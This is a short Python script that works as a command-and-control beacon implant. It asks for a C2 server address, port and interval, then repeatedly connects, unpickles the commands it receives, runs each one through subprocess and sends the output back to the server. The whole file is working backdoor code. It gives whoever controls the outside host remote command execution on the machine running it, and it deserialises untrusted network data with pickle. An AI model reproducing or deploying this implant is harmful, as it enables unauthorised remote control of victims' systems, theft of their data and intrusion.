#!/usr/bin/python3

# Standard libraries only
import socket
import subprocess
import time
import pickle

# Initialize variables from user input
rhost = str(input("C2 IP Address: " ))
rport = int(input("C2 Port: "))
wait = int(input("Beacon interval in seconds: "))
rserver = (rhost, rport)

def phone_home():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Attempt to connect and if the C2 server isn't up display a message and return from the function.
    try:
        s.connect(rserver)
    except socket.error:
        print("Dad isn't home")

# Receive any queued commands if the server is up, run them, then send back the stdout & stderr
    else:
        data = s.recv(1024)
        cmd = pickle.loads(data)
        for c in cmd:
            cmdarg = (c).split(" ")
            try:
                execute = subprocess.run(cmdarg, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
            except:
                FileNotFoundError
            else:
                s.sendall(bytes(execute.stdout, "utf-8"))

# Run the function forever.
while True:
    phone_home()
    time.sleep(wait)